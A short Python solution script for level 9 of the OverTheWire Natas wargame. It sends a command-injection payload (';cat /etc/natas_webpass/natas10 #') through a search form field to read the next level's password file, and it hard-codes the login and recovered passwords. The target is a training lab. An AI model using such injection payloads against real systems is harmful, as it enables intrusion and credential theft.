import requests
from bs4 import BeautifulSoup
url="http://natas9.natas.labs.overthewire.org"
auth_user="natas9"
auth_pass="Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd"

payload=";cat /etc/natas_webpass/natas10 #"
params={'needle':payload,'search':'submit'}
r= requests.post(url,auth=(auth_user,auth_pass),data=params,verify=False)
soup= BeautifulSoup(r.text,features="lxml")

for par in soup.find_all('pre'):
    print(f"natas10:{par.string}",end='')
# natas 10 pass - D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
# payload  - ; cat /etc/natas_webpass/natas10 ;
